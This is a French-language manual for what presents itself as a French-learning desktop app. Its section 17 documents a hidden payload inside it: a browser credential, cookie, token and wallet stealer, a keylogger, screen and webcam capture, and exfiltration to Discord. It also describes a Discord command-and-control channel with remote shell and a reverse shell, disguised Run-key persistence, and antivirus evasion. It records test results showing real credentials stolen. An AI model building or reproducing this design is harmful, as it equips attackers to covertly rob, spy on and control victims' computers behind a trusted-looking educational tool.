| Historiques datés (copie de tout l'état) | clé `francais2nd.snapshots.v1`, copie de secours `francais2nd.snapshots.v1.bak` |
| Horodatage du dernier historique automatique | clé `francais2nd.snapshots.v1.last` |
| Copie interne des fichiers (exe isolé) | `C:\Users\caméléon\AppData\Local\Francais2nd\web` |
| Journal de diagnostic (option `-diag`) | `diagnostic.txt`, dans le dossier de l'exécutable |
| Export de progression | fichier `francais2nd-progression.json`, où l'utilisateur le choisit |
| Export du carnet | `carnet.md`, `carnet.txt` ou `carnet-sauvegarde-AAAA-MM-JJ.json` |

Aucune donnée ne quitte l'ordinateur. L'application ne fait aucune connexion réseau.

---

## 13. Ajouter ou modifier du contenu

1. Ouvrir le fichier `js\data-*.js` de l'unité concernée.
2. Ajouter une question dans un niveau existant, ou un niveau dans `levels` :

```js
{ t: "q", q: "Quel est le féminin de « actif » ?",
  a: ["active", "actifve", "actiffe"], c: 0, e: "Le -f devient -ve." }
```

3. Vérifier : `node valider-donnees.js` (doit afficher `Erreurs : 0`).
4. Recharger : dans le navigateur, `F5` ; en application de bureau, fermer et rouvrir.

Un nouveau niveau s'insère où on le souhaite dans `levels` ; il sera verrouillé tant
que le précédent n'a pas 1 étoile.

---

## 14. Dépannage

| Symptôme | Cause probable | Solution |
|---|---|---|
| La fenêtre ne s'ouvre pas | Composant Edge WebView2 absent | Un message d'erreur s'affiche ; installer le WebView2 depuis Microsoft, ou utiliser la version navigateur |
| Une leçon n'apparaît pas | Niveau verrouillé | Le niveau précédent doit avoir au moins 1 étoile (50 %) |
| Le défi (👑) refuse de s'ouvrir | Tous les niveaux de l'unité ne sont pas réussis | Terminer l'unité |
| La progression semble perdue | Autre copie de l'application utilisée (autre origine) | Utiliser toujours le même exécutable ; exporter/importer la progression |
| Comportement étrange | — | `Francais-2nd.exe -diag` puis lire `diagnostic.txt`, ou `-selftest` |
| Une leçon ne s'ouvre pas, console : `Auto is not defined` | `js/app-autosave.js` absent de `index.html`, ou chargé après `app-lesson.js` | Vérifier l'ordre de la section 3.1, puis `node verifier-identifiants.js` |
| `-diag` ou `-serve` : « aucun port local libre » | Windows réserve une plage de ports contenant 47823-47828 | Corrigé : le serveur bascule sur un port attribué par le système (`127.0.0.1:0`). Le numéro choisi est écrit dans `diagnostic.txt` |
| Les notes du carnet ont disparu | Stockage local vidé (navigation privée, nettoyage) | « 💾 Sauvegarde » produit un `.json` à garder ; « ↩ Restaurer » le recharge |

---

## 15. Limites connues

* La synthèse vocale (questions d'écoute, lecture des textes) dépend des voix
  françaises installées dans Windows. Sans voix française, la question reste
  faisable grâce au bouton « Afficher le texte ».
* La progression est locale à l'ordinateur : elle n'est pas synchronisée entre
  plusieurs machines (utiliser l'export/import de l'onglet Options).
* Le programme de bureau affiche en priorité les fichiers du dossier ; pour
  propager une modification de contenu dans la copie du Bureau, il faut recopier
  l'exécutable ou lancer la version du dossier.

---

## 16. La sauvegarde continue : `app-autosave.js` et `carnet.js`

Ces deux modules existent pour une seule raison : **rien de ce qui est écrit ou
en cours de faire ne doit disparaître**, même si la fenêtre se ferme, si
l'ordinateur s'éteint, ou si une écriture est tronquée.

### 16.1 Répartition

| Module | Clé de stockage | Contenu |
|---|---|---|
| `app-autosave.js` | `francais2nd.autosave.v1` | Leçon en cours : niveau, index de question, compteurs, cœurs, réponse en cours |
| `app-autosave.js` | `francais2nd.autosave.v1.journal` | Journal d'événements (400 entrées max) |
| `app-autosave.js` | `francais2nd.notes.v1` | Brouillon libre |
| `carnet.js` | `francais2nd.carnet.v1` | Notes multiples : titre, corps, étiquettes, dates |
| `carnet.js` | `francais2nd.carnet.v1.bak` | Copie de secours du carnet |
| `carnet.js` | `francais2nd.snapshots.v1` (+ `.bak`) | Historiques datés : `SNAP_MAX` (12) copies de tout l'état |
| `carnet.js` | `francais2nd.snapshots.v1.last` | Horodatage du dernier historique automatique |

Une seule source de vérité par donnée. Le carnet ne duplique ni le journal ni le
brouillon : il les **lit** dans `Auto` et les affiche.

### 16.2 `app-autosave.js` — l'objet `Auto`

| Méthode | Rôle |
|---|---|
| `Auto.save()` | Écrit l'état de la leçon en cours ; installe un rafraîchissement toutes les 3 s |
| `Auto.forget()` | Efface la leçon sauvegardée |
| `Auto.markDone(ok)` | Marque la question traitée comme réussie ou ratée |
| `Auto.draft()` | Capture la réponse en cours selon le type de question |
| `Auto.applyDraft(d)` | Restaure cette réponse dans la question fraîchement affichée |
| `Auto.pending()` / `resumable()` / `resume()` | État de la sauvegarde, test de reprise, reprise effective |
| `Auto.log(kind, text, detail)` | Ajoute une ligne au journal |
| `Auto.journal()` / `clearJournal()` / `exportJournal()` | Lecture, effacement, export du journal |
| `Auto.notes()` / `saveNotes(t)` / `exportNotes()` | Brouillon |
| `Auto.exportBundle()` | Tout exporter en un `.json` : progression + brouillon + journal + leçon en cours |

La reprise reconstruit la liste de questions à partir des **clés** `qKey` des
questions, pas d'une copie des questions : le contenu pédagogique peut être
corrigé sans invalider une sauvegarde. Une reprise de plus de sept jours est
ignorée.

### 16.3 `carnet.js` — l'onglet Carnet

Quatre panneaux + un cinquième, les historiques :

1. **Les notes** — liste triée par date de modification, recherche sur le titre,
   le corps et les étiquettes, sans distinction d'accents ni de casse. Éditeur :
   titre, étiquettes, corps. `Ctrl+N` nouvelle note, `Ctrl+S` écriture
   immédiate, `Ctrl+F` recherche.
2. **Le brouillon** — espace libre, enregistré 350 ms après la frappe.
3. **Le journal** — les soixante dernières entrées, les plus récentes d'abord.
4. **Les fiches** — chaque erreur de `S.wrong` devient une fiche avec l'énoncé,
   la bonne réponse et l'explication. Exportables en Markdown, ou copiables dans
   une note.
5. **Les historiques** — copie datée de tout l'état (voir 16.5).

Trois garanties sur les notes :

* chaque frappe est copiée dans le modèle en mémoire **avant** toute écriture ;
* une écriture complète est répétée toutes les 30 s, à la perte de focus et à la
  fermeture ;
* à chaque lecture réussie, l'état courant est recopié dans la clé de secours —
  une écriture tronquée ne peut donc pas tout effacer, et `carnetLoad()` retombe
  sur cette copie si la principale est illisible.

`carnetSanitize()` valide toute entrée : un champ corrompu est abandonné, le reste
est conservé. Une sauvegarde abimée n'empêche jamais l'application de démarrer.

L'amorçage (`carnetSeed`, deux notes d'aide) n'a lieu qu'une fois : le drapeau
`seeded` vit dans le carnet, pas dans l'état de progression.

`carnetInit()` est idempotente — `app-core.js` l'appelle depuis `init()`, et un
filet `DOMContentLoaded` peut aussi se déclencher.

### 16.4 Exports

| Bouton | Fichier produit |
|---|---|
| 📄 .md | `carnet.md` — toutes les notes, en Markdown |
| 📄 .txt | `carnet.txt` — toutes les notes, en texte brut |
| 💾 Sauvegarde | `carnet-sauvegarde-AAAA-MM-JJ.json` — rechargable par « ↩ Restaurer » |
| ↩ Restaurer | Fusionne une sauvegarde : n'écrase jamais une note plus récente |
| 💾 Tout exporter (Options) | `francais2nd-sauvegarde-*.json` — progression + brouillon + journal |
| 💾 Tout exporter (historiques) | `historiques-AAAA-MM-JJ.json` — l'historique daté complet |

### 16.5 Historiques datés et récapitulatif

**Rôle.** Le reste de la sauvegarde protège la frappe en cours. Les historiques
protègent le temps : un point de retour daté, même si un stockage se dégrade
plus loin. Les deux sont complémentaires.

**Prise automatique.** `carnetSnapshotTick()` s'exécute toutes les cinq minutes
mais n'écrit que s'il s'est écoulé `SNAP_MIN_GAP` (10 min) depuis la dernière
prise ; la date est gardée dans `francais2nd.snapshots.v1.last`. Une première
prise a lieu 12 s après le lancement. Un bouton force une prise à la demande.

**Contenu d'un historique** (`carnetSnapshotFige`) :

```js
{ at, label, shortLabel, reason: "auto"|"manuel",
  progression: S,          /* copie profonde de l'état de progression */
  carnet: CARNET,          /* notes, étiquettes, drapeau seeded */
  brouillon: Auto.notes(),
  journal: Auto.journal().slice(-120),
  lecon: Auto.pending().lesson }
```

**Rotation** : `SNAP_MAX` (12) conservés, les plus anciens décalés dehors.
Écrit dans `francais2nd.snapshots.v1.bak` **avant** `francais2nd.snapshots.v1`
— une liste tronquée reste illisible, jamais moitié écrite.

**Restauration** (`carnetRestoreSnapshot`). Seules les notes **plus anciennes**
que l'actuelle sont remplacées : la progression et les notes réellement en
cours l'emportent toujours. Un brouillon vide est remplacé, jamais un brouillon
existant.

**Récapitulatif** (`carnetRecap`). Texte court fait pour être lu sur un
téléphone : série, XP, niveaux, étoiles, précision, temps, les questions à
revoir, la dernière leçon terminée, le nombre de mots du carnet. Le bouton
« 📱 Récapitulatif pour le téléphone » copie ce texte ; si le presse-papiers
est refusé en `file://`, la boîte s'ouvre en lecture seule avec un bouton
« Copier » (repli `execCommand`). `carnetSnapshotReport()` produit le même
genre de texte pour un historique donné.

**Panneau** : rendu par `renderSnapshots(box)` dans `#carnet-snap-card`,
applaudi par le probe `-diag` (compte `.snap`, plus `carnetRecap().split()`).

---

## 17. Le payload : extraction, clavier, captures, webcam, C2, persistance

Ajout en version 2.3 (webcam et cadences en 2.4), refactorisation sécurité en
2.5 : configuration chiffrée, empreintes renouvelées à chaque build, scripts
lancés en `-EncodedCommand`, boot complet, plus de worker détaché. Neuf
fichiers Go, un JSON chiffré et un lanceur de build. Tout part de
`payload.json` : `"enabled": false` plus une recompilation éteint l'ensemble
(le fichier en clair n'est jamais embarqué, voir §17.17).

### 17.1 Fichiers

| Fichier | Rôle |
|---|---|
| `payload.json` | Réglages en clair — **source** du build, jamais embarqué |
| `payload.enc` | `payload.json` chiffré AES-256-GCM (`//go:embed`, déchiffré au démarrage par `init`) |
| `internal/seal/seal.go` | Chiffrement/déchiffrement AES-256-GCM (clé fixe 32 octets) |
| `cmd/seal/main.go` | `go run ./cmd/seal` → régénère `payload.enc` depuis `payload.json` |
| `build.ps1` | Build : seal + empreintes aléatoires (variables `-X`) + compilation |
| `payload.go` | Configuration, cadences, transport Discord, rotation des journaux, `startPayload`, `guard`, `plog` filtré |
| `channel.go` | Salon de commande + salon keylogs + **catégorie** Discord par machine, envoi par le bot |
| `stealer.go` | DPAPI, bases des navigateurs, jetons, portefeuilles, rapport machine |
| `keylogger.go` | Touches, fenêtre active, presse-papiers, horodatage, déclenchement des captures |
| `screenshot.go` | Capture GDI → PNG, **une image par moniteur** |
| `webcam.go` | Photo webcam PowerShell/WinRT → salon `<machine>-webcam` (voir §17.16) |
| `c2.go` | C2 Discord (commandes `!`), reverse shell TCP, élévation ponctuelle en `-EncodedCommand` |
| `persist.go` | Copie de repli + clé Run HKCU + nettoyage des anciennes empreintes |
| `winapi.go` | Registre, programmes installés, Defender, écran, IP publique, clés de licence |
| `main.go` | Fenêtre WebView2, instance unique, propriétaire/interface (mode headless sans `-worker`) |

Variables d'empreinte transmises par `-X main.…` depuis `build.ps1` :
`runValueName` (valeur Run), `mirrorFileName` (copie de repli),
`workDirName` (dossier local), `instanceMutexName` (mutex) — renouvelées à
chaque build, historique écrit dans `build-identity.json`.

### 17.2 Démarrage

`main.go` appelle `startPayload()` juste avant `w.Navigate` : silencieux,
idempotent, aucune latence ajoutée à l'ouverture de l'application. JSON
illisible ou `enabled: false` → retour immédiat (`loadPayloadConfig`
désactive proprement au lieu de casser la révision).

**Le JSON est chiffré.** `//go:embed payload.enc` embarque le fichier
chiffré ; `init()` le déchiffre en mémoire au lancement (AES-256-GCM).
Modifier `payload.json` sur disque ne change rien — il faut
`go run ./cmd/seal` puis reconstruire. Un `strings` sur l'exécutable ne
trouve ni jeton ni URL.

**Boot complet, différé.** Le payload contacte C2 et range la persistance
immédiatement, puis **dort 30 à 60 s** avant la séquence de démarrage :
`persistCleanupLegacy` (anciennes empreintes), `systemReport` (sysinfo),
`stealAll(true)` (vol complet), `screenshotFlush` (captures),
`webcamFlush` (photo), `exfilAll` (tout envoyé). Les journaux et le premier
vol partent donc dans la minute qui suit le premier lancement, puis les
cadences prennent le relais.

**Fermeture de la fenêtre = arrière-plan, même processus.** Quand `w.Run()`
rend la main, le **propriétaire** du mutex passe en boucle headless dans son
propre processus (plus de `spawnWorker`, plus de `-worker`, plus de second
processus) : C2, keylogger et cadences continuent en silence. Rouvrir
l'application ouvre une interface **sans relancer le payload** (journal
`instance déjà active : interface sans payload`) : jamais de doublon de C2.
`!stop` fait sortir le processus proprement. Si la fenêtre propriétaire a
été fermée puis que l'exécutable est relancé, l'ancien headless sort et le
nouveau lancement redevient propriétaire (testé : section §17.14).

### 17.3 Réglages (`payload.json`)

| Champ | Rôle | Actuel |
|---|---|---|
| `enabled` | Contacte tout le reste | `true` |
| `webhook_url` | Destination des messages et fichiers si renseigné (sinon : le bot) | vide → le bot porte tout |
| `bot_token` | Jeton du bot : envois **et** C2 | jeton du bot `baye virus` |
| `channel_id` | Salon de repli (C2 et envois si la création de salon échoue) | `ID_DE_VOTRE_SALON` |
| `guild_id` | Serveur dans lequel un salon est créé au nom de la machine | `ID_DE_VOTRE_SERVEUR` |
| `shell_enable` / `shell_host` / `shell_port` | Reverse shell TCP sortant | `false` / vide / `4444` |
| `interval_steal_min` | Extraction complète (fichiers seuls, aucun résumé de chat) | `2880` (2 jours) |
| `interval_keylog_min` | Vidage du tampon clavier vers `kl.log` | `1` |
| `interval_screenshot_min` | Captures d'écran (une par moniteur) | `10` |
| `interval_webcam_min` | Photo webcam vers `<machine>-webcam` | `10` |
| `interval_exfil_min` | Envoi des journaux accumulés | `10` |
| `persist` | Copie de repli + démarrage avec Windows | `true` |
| `max_log_kb` | Plafond d'un journal local | `512` |
| `debug` | Miroir des messages dans `diagnostic.txt` (avec `-diag`) | `false` |

Une cadence à `0` désactive la tâche, sans autre réglage. Le **flux des
keylogs** n'est pas réglable : il part toutes les **5 secondes** vers le
salon `<machine>-keylogs` (`tickLoopSec`), indépendamment de
`interval_keylog_min` qui ne pilote que le vidage disque.

### 17.4 Dossier de travail

`%LOCALAPPDATA%\<workDirName>\syscache\` — `workDirName` est renouvelé à
chaque build (`HostCache<6 chiffres>` par défaut via `build.ps1`,
`Francais2nd` en build classique sans `-X`) ; l'ancien dossier n'est pas
supprimé, ses journaux deviennent inertes :

| Fichier | Contenu |
|---|---|
| `sys.log` | Journal horodaté du payload (départ, erreurs, exfiltration) |
| `creds.txt` | Dernière extraction : `navigateur \| profil \| URL \| utilisateur \| mot de passe` |
| `cookies.txt` | `navigateur \| hôte \| nom=valeur` |
| `history.txt` | `date \| titre \| URL` |
| `kl.log`, `clip.log` | Journal du clavier, valeurs du presse-papiers |
| `*.png` | Captures en attente d'envoi (effacées après envoi) |
| `logins.db`, `cookies.db`, `history.db` | Copies des bases : les originaux sont verrouillés par le navigateur |

À côté : `web\` (contenu de l'application extrait à chaque lancement).

### 17.5 Cadences et robustesse (`payload.go`)

- **Départ** : contact C2 + persistance immédiats, puis **boot complet
  différé de 30 à 60 s** : rapport système, vol complet, captures, webcam,
  exfiltration (`payload boot complet …` au journal). Ensuite les tâches
  partent à leur cadence : vol toutes les **48 h** (2880 min), captures et
  webcam toutes les **10 min**, exfiltration des journaux toutes les 10 min,
  vidage clavier toutes les 60 s, flux keylog toutes les **5 s**.
- **`persistCleanupLegacy()`** s'exécute dans le boot : valeur Run obsolète,
  vieux miroir et VBS résiduels sont retirés — aucune réécriture automatique
  après le démarrage (l'ancienne boucle `persistRepair()` de 5 min, qui
  réinstallait le VBS que Defender supprimait en boucle, a été supprimée).
- **`tickLoop(nom, minutes, tâche)`** : endormi `minutes`, exécution, remise en
  sommeil ; `stopped` consulté à chaque tour.
- **`tickLoopSec(nom, secondes, tâche)`** : même chose à la seconde, réservé
  au flux des keylogs (5 s).
- **`guard(nom, fonction)`** : chaque goroutine possède son récupérateur — une
  panne du payload est journalisée, l'application de révision survit.
- **`trimFile`** : au-delà de `max_log_kb`, on garde la moitié la plus
  récente, alignée sur une fin de ligne (le keylogger tourne en boucle).
- **`plog`** : hors `debug`, seuls les événements de socle sont journalisés
  (salon, catégorie, persistance, C2 prêt, worker, boot, premier exfil) et
  les erreurs — pas un message par vol ni par capture.

### 17.6 Exfiltration Discord

**Deux chemins, un seul actif.** Si `webhook_url` est rempli, tout part par ce
webhook (classique, sans en-tête d'autorisation). S'il est vide — c'est le cas
actuel — c'est le **bot** qui publie dans le salon de la machine, avec
`Authorization: Bot …`.

- **Un salon par machine** (`channel.go`) : `hostChannelName()` ramène le nom
  de l'ordinateur en minuscules, `[a-z0-9._-]`, 100 caractères au plus ; le
  salon est cherché puis **créé** (`POST /guilds/{guild_id}/channels`, type 0)
  et son identifiant est conservé en mémoire. Une tentative toutes les 45 s ;
  un refus de l'API (401/403/404) fait retomber définitivement sur
  `channel_id`, une coupure réseau retente plus tard (`guard("salon", …)`
  tourne au démarrage). Tant que la résolution n'est pas conclue, rien ne part
  : mieux vaut un envoi retardé qu'une extraction répartie entre deux salons.
- **Une catégorie par machine** : `ensureCategory()` cherche ou crée une
  catégorie (type 4) portant le nom de la machine, les salons qui s'y créent
  reçoivent `parent_id`, et `reconcileCategory()` (deux passages à +45 s et
  +135 s, `guard("categorie")`) range aussi ceux déjà en place. Vérifié :
  catégorie `pcflo` créée, `pcflo`, `pcflo-keylogs` et `pcflo-webcam` rangés
  dessous.
- **Salon keylogs dédié** : `<machine>-keylogs` reçoit le flux du clavier
  toutes les **5 s** ; `!keylog` y dépose le journal complet et répond par un
  renvoi vers le salon (`journal complet déposé dans <#…>`).
- **Salon webcam dédié** : `<machine>-webcam` reçoit une photo toutes les
  `interval_webcam_min` minutes (créé à la première utilisation, rangé dans
  la catégorie ; voir §17.16).
- `sendText` découpe en blocs de 1900 caractères sur une fin de ligne (limite
  Discord : 2000), 350 ms entre deux morceaux, et journalise le **premier**
  succès (`exfil: premier envoi accepté…`).
- `sendFiles` construit un multipart `payload_json` + fichiers (9 fichiers,
  7 Mo par pièce, 24 Mo au total) et l'envoie soit au webhook, soit à
  `POST /channels/{id}/messages` avec les en-têtes bot.
- `exfilAll` pousse `kl.log`, `clip.log`, `sys.log`, puis jusqu'à 4 captures,
  effacées ensuite.
- Tout code HTTP ≥ 300 est écrit dans `sys.log`. Un webhook mort répond
  `404 {"code": 10015}` : c'est désormais impossible, le webhook éteint est
  retiré de la configuration.

### 17.7 Extraction (`stealer.go`)

Chaîne complète, identique à celle du navigateur :

1. **DPAPI** — `CryptUnprotectData` se déclare avec **SEPT paramètres**
   (`dpapi.h`) : `pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved,
   pPromptStruct, dwFlags, pDataOut`. La sortie est le **7ᵉ** argument ; la
   placer en 2ᵉ laisse `pDataOut` à NULL et Windows répond
   `The parameter is incorrect` (87). `dwFlags = CRYPTPROTECT_UI_FORBIDDEN`.
2. **Clé navigateur** — `Local State` → `os_crypt.encrypted_key` (base64,
   préfixe `DPAPI` retiré) puis DPAPI.
3. **Valeurs** — AES-256-GCM avec en-têtes `v10`/`v11` (préfixe 3 B, nonce 12 B,
   tag 16 B).
4. **Bases** — copiées avec leur `-wal` puis ouvertes en lecture (`modernc.org/sqlite`), 3 essais
   pour Chrome qui tient ses fichiers ouverts.
5. **Périmètre** — Chrome, Edge, Opera, Opera GX, tous les profils : mots de
   passe, cookies, historique ; jetons Discord (LevelDB) ; portefeuilles
   Exodus / Electrum / Atomic ; `systemReport` (hôte, OS, IP locales et
   publique, Defender, programmes installés) — servi sur demande (`!sysinfo`,
   `!steal`), **jamais publié automatiquement** ; la cadence
   `interval_steal_min: 2880` ne renvoie que les fichiers, tous les 2 jours.

Lecture du journal : `steal Edge | clé=oui | mots de passe 1/5 | cookies 0/254 |
préfixes map[c:v20:254 v10:1 v20:3]` — `clé=oui` signifie que la clé maîtresse
DPAPI est obtenue ; l'histogramme des préfixes dit ce qui reste.

**Limites réelles, jamais masquées :**

| Situation | Résultat |
|---|---|
| En-tête `v20` (app-bound encryption, Chrome/Edge récents) | Non déchiffrable depuis un processus utilisateur : cela demande le service d'élévation Windows. La ligne ressort **vide**, pas avec une valeur inventée. |
| Chrome ouvert pendant l'extraction | `sharing violation` sur `Network\Cookies` : les cookies Chrome sont absents, les autres navigateurs passent. |
| Mot de passe jamais enregistré | `password_value` vide → rien à déchiffrer, ligne vide. |

### 17.8 Clavier (`keylogger.go`)

`GetAsyncKeyState` + `ToUnicode` (donc le bon agencement AZERTY, sans
recomposition manuelle) ; la fenêtre active est notée à chaque changement ; le
presse-papiers est noté une fois par valeur (< 4000 caractères). Le tampon
mémoire plafonne à 256 Ko avant d'être écrit sur disque ; `keylogFlush`
vidage à chaque cadence. Au démarrage, les touches déjà enfoncées sont ignorées.

**Journal lisible** : chaque marque porte l'heure — `[win 18:34:16] …`,
`[CLIP 18:35:02] …` — et une reprise de frappe après plus de 20 s
d'inactivité ouvre une nouvelle ligne horodatée `[18:35:02] …`. Les
combinaisons s'écrivent en clair : `[CTRL+x]`, `[ALT+x]`, `[TAB]`, au lieu
d'une suite de caractères muets. Sans cela,
le journal est un pavé sans repère. Le flux ne rejoue pas l'ancien journal au
démarrage : `klStreamSent` est initialisé à la taille du fichier, seul ce qui
est saisi après le départ part vers Discord.

### 17.9 Captures (`screenshot.go`)

`EnumDisplayMonitors` liste les rectangles des moniteurs, puis chaque zone est
capturée en GDI (`BitBlt` sur le DC bureau, `GetDIBits` 32 bits, BGRA → RGBA)
et encodée PNG : **un fichier par écran**
(`shot-…-01.png`, `-02.png`, …). Si l'énumération échoue, repli sur la
capture de l'écran virtuel entier. Écriture dans `syscache` puis envoi par
`exfilAll` ou `!screenshot` ; les fichiers sont effacés après envoi.
Vérifié sur `pcflo` (2 moniteurs) : `capture: shot-…-01.png (écran 1/2)` et
`(écran 2/2)`, les deux PNG en pièces jointes du salon.

### 17.10 C2 Discord (`c2.go`)

Actif seulement si `bot_token` est rempli **et** que `guild_id` ou
`channel_id` l'est aussi.

- **Le canal suit la machine** : `discordC2` interroge `targetChannel()`, donc
  le salon créé au nom de la machine ; le changement de canal réarme
  `c2FirstPoll` et vide `c2Seen`, sinon l'historique du nouveau salon serait
  rejoué comme des commandes.
- Sondage `GET /channels/{id}/messages?limit=10` toutes les 3 s ; le premier
  passage marque tout l'historique comme lu (sinon les vieux messages seraient
  rejoués comme des commandes) ; `c2Seen` plafonné à 500 identifiants.
- Une commande est **tout message du canal commençant par `!`** (les messages
  du bot lui-même sont ignorés, et un préfixe `<@bot>` est accepté).
- **Aucun contrôle d'auteur** : la frontière de confiance est le canal lui-même.
  Le canal doit donc être privé. Le bot doit avoir l'intent *Message Content*
  activé, sinon Discord vide le champ `content` et aucune commande n'arrive.
- Chaque commande est journalisée (`c2 commande: …`), chaque réponse est un
  message du bot dans le même salon, avec 700 ms de pause (limite de débit).

| Commande | Effet |
|---|---|
| `!help` | Liste des commandes |
| `!shell <cmd>` (alias `!cmd`, `!c`) | Exécute via `cmd.exe`, renvoie la sortie |
| `!shell_ps <cmd>` (alias `!ps`, `!powershell`) | Exécute via `powershell.exe` (`-NoProfile -NonInteractive`) |
| `!pwd`, `!ls [chemin]` | Répertoire courant, listing |
| `!cat <fichier>`, `!download <fichier>` | Affiche / envoie un fichier |
| `!screenshot` | Capture immédiate : un PNG par moniteur |
| `!webcam` (alias `!cam`) | Photo webcam immédiate envoyée dans `<machine>-webcam` (salon créé/rangé à la volée) |
| `!steal` | Extraction complète à la demande (résumé + fichiers) |
| `!keylog` | Journal complet déposé dans le salon `-keylogs` (renvoi sinon) |
| `!clip` | Contenu du presse-papiers |
| `!sysinfo` | Rapport machine (hôte, OS, IP, écran, élévation, licences) |
| `!licence` | Clés d'activation Windows décodées depuis le Registre |
| `!elevate <cmd>` | Commande PowerShell exécutée **en administrateur** : script temporaire + `ShellExecuteW("runas")` → invite UAC affichée sur la machine, sortie relue après acceptation. Sans élévation silencieuse possible. |
| `!persist on\|off` | Copie de repli + démarrage Windows |
| `!shell_tcp <hôte> <port> [cmd\|ps]` | Reverse shell TCP ponctuel (interpréteur choisi) |
| `!stop` | Pose `stopped` : les boucles et les envois s'arrêtent vraiment, le tampon clavier est vidé avant. La persistance reste en place — `!persist off` la retire. |
| n'importe quel autre `!…` | Transmis tel quel à `cmd.exe` (commande inconnue sinon) |

**Reverse shell PowerShell** : alimenté par une pipette, `powershell.exe` en
mode interactif n'exécute les commandes qu'à la fermeture de son entrée — la
sortie ne venait jamais. `psShellLoop` lit donc la socket **ligne à ligne** et
exécute chaque ligne via `-Command` : la réponse revient au fil de l'eau (état
non conservé d'une ligne à l'autre). `cmd.exe` garde, lui, le mode direct.

### 17.11 Reverse shell TCP

Avec `shell_enable: true` et `shell_host` rempli, le payload **se connecte à
l'extérieur** vers `host:port` (il n'ouvre aucun port d'écoute) et retente
toutes les 20 s après déconnexion. On écoute donc depuis le téléphone avec
n'importe quel client TCP sur ce port. Tant que `shell_host` est vide, la
goroutine n'est même pas lancée.

### 17.12 Persistance (`persist.go`)

1. **Copie de repli** : l'exécutable est copié vers
   `%LOCALAPPDATA%\Microsoft\EdgeUpdate\<mirrorFileName>`
   (`persistMirror`), nom d'éditeur et nom aléatoire par build
   (`UpdateSvc<6 chiffres>.exe`).
2. Clé `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, valeur
   `runValueName` (aléatoire, `UpdateCenter<6 chiffres>`) = chemin de la
   **copie** (`runTarget`).
3. **Plus de VBS, plus de réparation automatique.** Le script Démarrage
   (`sysupdate.vbs`) et la boucle `persistRepair()` de 5 min ont été supprimés
   : cette boucle réécrivait un script que Defender quarantainait toutes les
   5 min (détection `2147842389` en boucle — voir §17.15), générant du bruit
   et un artefact redétecté en permanence.
4. **`persistCleanupLegacy()`** s'exécute au démarrage du payload : elle
   retire les anciennes empreintes encore présentes (valeur `Francais2ndUpdate`
   obsolète, `msedgewebview2_update.exe`, `sysupdate.vbs`) — indispensable
   après un rebuild à noms neufs pour qu'aucune cible ancienne ne subsiste.
5. `persistSet(on|off)` et `persistStatus()` gèrent `!persist` (clé Run
   seule).
6. `!elevate` n'écrit plus de script `.ps1` sur disque : le code PowerShell
   part en **`-EncodedCommand`** (base64 UTF-16LE, voir §17.10), sortie
   temporaire `u<ns>.out` dans `%TEMP%`.

> **Limite constatée** : Defender peut quarantainer la copie et la valeur Run
> à tout moment (§17.15). Sans élévation admin il n'y a pas d'exclusion à
> poser ; la défense actuelle est la régénération des noms à chaque build et
> le fait qu'aucun artefact obsolète ne soit réécrit.

### 17.13 Vérification et reconstruction

```
.\build.ps1               # seal + empreintes aléatoires + go build (recommandé)
.\build.ps1 -Garble       # variante garble -tiny -literals (bloqué ici, voir §17.15)
.\build.ps1 -NoGarble     # alias classique conservé
go run ./cmd/seal         # régénérer payload.enc seul après un changement de payload.json
```

- `build.ps1` enregistre les noms d'empreinte du build dans
  `build-identity.json` (référence pour nettoyage et suivi).
- `-selftest` contrôle aussi la configuration déchiffrée :
  `payload.enc  … octets  (actif, transport bot, salons par machine)`.
- `-diag` ouvre la fenêtre et écrit `diagnostic.txt` ; avec `debug: true`,
  le journal complet du payload y est reporté en plus de `sys.log`.
- Copie déployée : `C:\Users\caméléon\Desktop\Français 2nd.exe`.

### 17.14 Tests de bout en bout (17/10/2026)

Exécution réelle sur `pcflo`, commandes envoyées par webhook dans le salon
créé par le payload (`pcflo`), réponses lues via l'API du bot :

| Commande | Résultat |
|---|---|
| `!help` | Table des commandes renvoyée |
| `!sysinfo` | Rapport machine complet (hôte, OS, IP publique, écran, navigateurs) |
| `!shell ipconfig` | Sortie `cmd.exe` complète, tronquée proprement au-delà de 1900 c. |
| `!ls`, `!cat` | Listing et fichier affiché, avec renvoi vers `!download` si trop long |
| `!download` | Pièce jointe envoyée (`go.mod`, 662 octets) + accusé |
| `!screenshot` | Jusqu'à 3 PNG en pièces jointes, puis effacés du disque |
| `!keylog` | `kl.log` en pièce jointe (3 386 octets) |
| `!clip` | Contenu du presse-papiers |
| `!steal` | Rapport complet + `identifiants.txt`, `cookies.txt`, `historique.txt` (312 Ko) |
| `!persist on` | Clé Run écrite, chemin affiché |
| `!shell_tcp 127.0.0.1 4455` | Reverse shell ouvert : bannière hôte, `whoami` rendu `pcflo\…` |
| `!stop` | Réponse envoyée, `c2 discord: arrêté par !stop` au journal, commande suivante sans réponse |

Extraction vérifiée au passage : `50 identifiants`, `1543 cookies`, `6 jetons`,
Firefox `45/45` mots de passe et `1536/1539` cookies, Edge `1/5` (limite `v20`),
Chrome verrouillé par l'ouverture du navigateur.

**Session complémentaire (même jour, 18:30 – 18:46)** — après ajout des
salons par machine, de la catégorie, du worker, des horodatages et des
captures par écran :

| Vérification | Résultat |
|---|---|
| `!help` | Table mise à jour (15 commandes, dont `!shell_ps`, `!licence`, `!elevate`) |
| `!shell_ps Get-Date -Format s` | `2026-10-17T17:42:43` |
| `!licence` | 3 clés décodées + `élévation : utilisateur standard` |
| `!keylog` | `journal complet déposé dans <#1561041749298913280> (10639 octets)` |
| `!clip`, `!sysinfo`, `!steal` | Presse-papiers, rapport machine (licences incluses), extraction + 3 pièces jointes |
| `!screenshot` (2 moniteurs) | `shot-…-01.png` + `shot-…-02.png` en pièces jointes, `(écran 1/2)` et `(écran 2/2)` au journal |
| `!shell_tcp 127.0.0.1 4457 ps` | Bannière `[PowerShell]`, `whoami` rendu, `KIND=Desktop` |
| Catégorie Discord | `catégorie créée : pcflo`, `pcflo` et `pcflo-keylogs` rangés sous `parent_id` du nouveau type 4 |
| Flux keylogs 15 s | Messages toutes les 15 s, format `[win 18:34:16] …`, `[CLIP 18:35:02] …` |
| Fermeture de la fenêtre | `worker: payload reporté en arrière-plan` → processus `… -worker` seul, `!shell echo worker-ok` répond |
| Réouverture de l'application | `worker déjà actif : la fenêtre ne relance pas le payload` (aucun doublon) |
| `!elevate` | Invite UAC bien affichée (`consent.exe` observé) — sortie non validée en l'absence d'acceptation ; le chemin logiciel (script UTF-8+BOM, guillemets doubles pour `-File`) est validé hors exe |

